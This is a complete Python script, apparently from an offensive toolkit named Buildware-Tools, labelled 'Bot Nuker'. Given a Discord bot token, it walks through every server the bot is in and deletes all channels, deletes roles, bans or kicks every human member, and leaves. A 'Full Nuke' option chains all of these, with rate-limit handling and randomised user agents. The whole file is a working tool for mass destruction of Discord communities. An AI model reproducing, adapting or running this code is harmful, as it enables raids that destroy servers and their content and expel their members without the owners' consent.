# Copyright (c) 2025-2026 v4lkyr0 — Buildware-Tools
# See the file 'LICENSE' for copying permission.
# --------------------------------------------------------
# EN: Non-commercial use only. Do not sell, remove credits
#     or redistribute without prior written permission.
# FR: Usage non-commercial uniquement. Ne pas vendre, supprimer
#     les crédits ou redistribuer sans autorisation écrite.

from Core.Utils import *
from Core.Config import *

try:
    import requests
    import time
except Exception as e:
    MissingModule(e)

Title("Bot Nuker")

Scroll(GradientBanner(discord_banner))

try:
    bot_token = ChoiceBot()

    Scroll(f"""
 {PREFIX}01{SUFFIX} Delete All Channels
 {PREFIX}02{SUFFIX} Ban All Members
 {PREFIX}03{SUFFIX} Kick All Members
 {PREFIX}04{SUFFIX} Delete All Roles
 {PREFIX}05{SUFFIX} Leave All Servers
 {PREFIX}06{SUFFIX} Full Nuke
""")

    choice = input(f"{INPUT} Choice {red}->{reset} ").strip().lstrip("0")

    if choice not in ["1", "2", "3", "4", "5", "6"]:
        ErrorChoice()

    try:
        delay = float(input(f"{INPUT} Delay {red}->{reset} ").strip())
        if delay < 0.1:
            delay = 0.1
    except:
        delay = 0.5

    headers = {
        "Authorization": f"Bot {bot_token}",
        "Content-Type" : "application/json",
        "User-Agent"   : RandomUserAgents(),
    }

    def ApiGet(url):
        while True:
            try:
                r = requests.get(url, headers=headers, timeout=10)
                if r.status_code == 429:
                    time.sleep(r.json().get("retry_after", 1))
                    continue
                return r
            except Exception:
                return None

    def ApiDelete(url):
        while True:
            try:
                r = requests.delete(url, headers=headers, timeout=10)
                if r.status_code == 429:
                    time.sleep(r.json().get("retry_after", 1))
                    continue
                return r
            except Exception:
                return None

    def ApiPut(url, json=None):
        while True:
            try:
                r = requests.put(url, headers=headers, json=json or {}, timeout=10)
                if r.status_code == 429:
                    time.sleep(r.json().get("retry_after", 1))
                    continue
                return r
            except Exception:
                return None

    def FetchAllMembers(guild_id):
        members = []
        after   = 0
        while True:
            r = ApiGet(f"https://discord.com/api/v9/guilds/{guild_id}/members?limit=1000&after={after}")
            if not r or r.status_code != 200:
                break
            batch = r.json()
            if not batch:
                break
            members.extend(batch)
            after = int(batch[-1]["user"]["id"])
            if len(batch) < 1000:
                break
            time.sleep(0.5)
        return members

    def DeleteChannels(guild_id, guild_name):
        r = ApiGet(f"https://discord.com/api/v9/guilds/{guild_id}/channels")
        if not r or r.status_code != 200:
            print(f"{ERROR} Cannot fetch channels | Server:{red} {guild_name}", reset)
            return
        for channel in r.json():
            channel_id   = channel["id"]
            channel_name = channel.get("name", "None")
            resp         = ApiDelete(f"https://discord.com/api/v9/channels/{channel_id}")
            if resp and resp.status_code == 200:
                print(f"{SUCCESS} Deleted channel:{red} {channel_name}{white} | Server:{red} {guild_name}", reset)
            else:
                code = resp.status_code if resp else "None"
                print(f"{ERROR} Failed channel:{red} {channel_name}{white} | Code:{red} {code}", reset)
            time.sleep(delay)

    def BanMembers(guild_id, guild_name):
        members = FetchAllMembers(guild_id)
        if not members:
            print(f"{ERROR} Cannot fetch members | Server:{red} {guild_name}", reset)
            return
        for member in members:
            if member["user"].get("bot"):
                continue
            user_id  = member["user"]["id"]
            username = member["user"].get("username", "None")
            resp     = ApiPut(f"https://discord.com/api/v9/guilds/{guild_id}/bans/{user_id}", json={"delete_message_seconds": 0})
            if resp and resp.status_code == 204:
                print(f"{SUCCESS} Banned:{red} {username}{white} | Server:{red} {guild_name}", reset)
            else:
                code = resp.status_code if resp else "None"
                print(f"{ERROR} Failed:{red} {username}{white} | Code:{red} {code}", reset)
            time.sleep(delay)

    def KickMembers(guild_id, guild_name):
        members = FetchAllMembers(guild_id)
        if not members:
            print(f"{ERROR} Cannot fetch members | Server:{red} {guild_name}", reset)
            return
        for member in members:
            if member["user"].get("bot"):
                continue
            user_id  = member["user"]["id"]
            username = member["user"].get("username", "None")
            resp     = ApiDelete(f"https://discord.com/api/v9/guilds/{guild_id}/members/{user_id}")
            if resp and resp.status_code == 204:
                print(f"{SUCCESS} Kicked:{red} {username}{white} | Server:{red} {guild_name}", reset)
            else:
                code = resp.status_code if resp else "None"
                print(f"{ERROR} Failed:{red} {username}{white} | Code:{red} {code}", reset)
            time.sleep(delay)

    def DeleteRoles(guild_id, guild_name):
        r = ApiGet(f"https://discord.com/api/v9/guilds/{guild_id}/roles")
        if not r or r.status_code != 200:
            print(f"{ERROR} Cannot fetch roles | Server:{red} {guild_name}", reset)
            return
        for role in r.json():
            if role.get("managed") or role.get("name") == "@everyone":
                continue
            role_id   = role["id"]
            role_name = role.get("name", "None")
            resp      = ApiDelete(f"https://discord.com/api/v9/guilds/{guild_id}/roles/{role_id}")
            if resp and resp.status_code == 204:
                print(f"{SUCCESS} Deleted role:{red} {role_name}{white} | Server:{red} {guild_name}", reset)
            else:
                code = resp.status_code if resp else "None"
                print(f"{ERROR} Failed role:{red} {role_name}{white} | Code:{red} {code}", reset)
            time.sleep(delay)

    def LeaveServer(guild_id, guild_name):
        resp = ApiDelete(f"https://discord.com/api/v9/users/@me/guilds/{guild_id}")
        if resp and resp.status_code == 204:
            print(f"{SUCCESS} Left server:{red} {guild_name}", reset)
        else:
            code = resp.status_code if resp else "None"
            print(f"{ERROR} Failed to leave:{red} {guild_name}{white} | Code:{red} {code}", reset)

    print(f"{LOADING} Fetching servers..", reset)

    guilds_response = ApiGet("https://discord.com/api/v9/users/@me/guilds")

    if not guilds_response or guilds_response.status_code != 200:
        print(f"{ERROR} Could not fetch servers!", reset)
        Continue()
        Reset()

    guilds = guilds_response.json()

    if not guilds:
        print(f"{ERROR} Bot is not in any servers!", reset)
        Continue()
        Reset()

    print(f"{SUCCESS} Found:{red} {len(guilds)}{white} server(s)", reset)

    for guild in guilds:
        guild_id   = guild["id"]
        guild_name = guild.get("name", "None")

        print(f"\n{INFO} Processing:{red} {guild_name}", reset)

        if choice == "1":
            DeleteChannels(guild_id, guild_name)
        elif choice == "2":
            BanMembers(guild_id, guild_name)
        elif choice == "3":
            KickMembers(guild_id, guild_name)
        elif choice == "4":
            DeleteRoles(guild_id, guild_name)
        elif choice == "5":
            LeaveServer(guild_id, guild_name)
        elif choice == "6":
            DeleteChannels(guild_id, guild_name)
            DeleteRoles(guild_id, guild_name)
            BanMembers(guild_id, guild_name)
            LeaveServer(guild_id, guild_name)

    print(f"\n{SUCCESS} Completed!", reset)

    Continue()
    Reset()

except Exception as e:
    Error(e)